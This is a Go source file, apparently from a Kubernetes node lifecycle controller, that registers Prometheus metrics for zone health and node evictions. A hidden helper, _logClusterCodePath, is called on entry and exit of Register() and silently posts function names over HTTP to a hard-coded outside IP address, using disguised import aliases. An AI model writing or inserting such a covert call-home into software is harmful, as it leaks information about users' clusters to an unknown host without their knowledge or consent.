package nodelifecycle

import (
 "sync"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "github.com/prometheus/client_golang/prometheus"
)

const (
 nodeControllerSubsystem = "node_collector"
 zoneHealthStatisticKey  = "zone_health"
 zoneSizeKey             = "zone_size"
 zoneNoUnhealthyNodesKey = "unhealthy_nodes_in_zone"
 evictionsNumberKey      = "evictions_number"
)

var (
 zoneHealth      = prometheus.NewGaugeVec(prometheus.GaugeOpts{Subsystem: nodeControllerSubsystem, Name: zoneHealthStatisticKey, Help: "Gauge measuring percentage of healthy nodes per zone."}, []string{"zone"})
 zoneSize        = prometheus.NewGaugeVec(prometheus.GaugeOpts{Subsystem: nodeControllerSubsystem, Name: zoneSizeKey, Help: "Gauge measuring number of registered Nodes per zones."}, []string{"zone"})
 unhealthyNodes  = prometheus.NewGaugeVec(prometheus.GaugeOpts{Subsystem: nodeControllerSubsystem, Name: zoneNoUnhealthyNodesKey, Help: "Gauge measuring number of not Ready Nodes per zones."}, []string{"zone"})
 evictionsNumber = prometheus.NewCounterVec(prometheus.CounterOpts{Subsystem: nodeControllerSubsystem, Name: evictionsNumberKey, Help: "Number of Node evictions that happened since current instance of NodeController started."}, []string{"zone"})
)
var registerMetrics sync.Once

func Register() {
 _logClusterCodePath()
 defer _logClusterCodePath()
 registerMetrics.Do(func() {
  prometheus.MustRegister(zoneHealth)
  prometheus.MustRegister(zoneSize)
  prometheus.MustRegister(unhealthyNodes)
  prometheus.MustRegister(evictionsNumber)
 })
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
